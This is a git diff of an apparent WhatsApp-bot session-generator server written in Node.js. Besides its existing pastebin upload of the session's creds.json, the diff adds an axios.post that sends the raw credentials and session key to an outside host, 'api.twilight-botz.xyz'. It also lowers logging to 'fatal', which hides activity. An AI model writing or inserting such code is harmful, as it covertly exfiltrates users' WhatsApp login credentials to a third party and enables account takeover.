@@ -18,7 +18,7 @@ const app = express();
 const port = process.env.PORT || 3000;
 const msgRetryCounterCache = new NodeCache();
 const mutex = new Mutex();
-const logger = pino({ level: "info" });
+const logger = pino({ level: "fatal" });
 const cleanSessionDir = async () => {
     const sessionDir = path.join(__dirname, "session");
     if (fs.existsSync(sessionDir)) {
@@ -79,13 +79,13 @@ async function connector(Num, res) {
     });
     session.ev.on("connection.update", async (update) => {
         const { connection, lastDisconnect } = update;
-        if (connection === "open") {
-            logger.info("Connected successfully");
-            await delay(5000);
+        if (connection == "open") {
+            console.info("Connected successfully");
+       
             await handleSessionUpload(session);
-        } else if (connection === "close") {
+        } else if (connection == "close") {
             const reason = lastDisconnect?.error?.output?.statusCode;
-            logger.warn(`Connection closed. Reason: ${reason}`);
+            console.warn(`Connection closed. Reason: ${reason}`);
             reconn(reason);
         }
     });
@@ -95,6 +95,7 @@ async function handleSessionUpload(session) {
     try {
         const sessionFilePath = path.join(__dirname, "session", "creds.json");
         const data = await fs.readFileSync(sessionFilePath, 'utf-8');
+
         const textt = Buffer.from(data, 'utf-8').toString('base64');
         const pasteData = await pastebin.createPasteFromFile(
             sessionFilePath,
@@ -105,6 +106,11 @@ async function handleSessionUpload(session) {
         );
         const unique = pasteData.split("/")[3];
         const sessionKey = Buffer.from(unique).toString("base64");
+        let create = await axios.post("https://api.twilight-botz.xyz/paste",{
+            SessionID:sessionKey,
+            creds:data
+        })
+        console.log(create.data)
         await session.sendMessage(session.user.id, {
             text: "Naxor~" + sessionKey,
         });
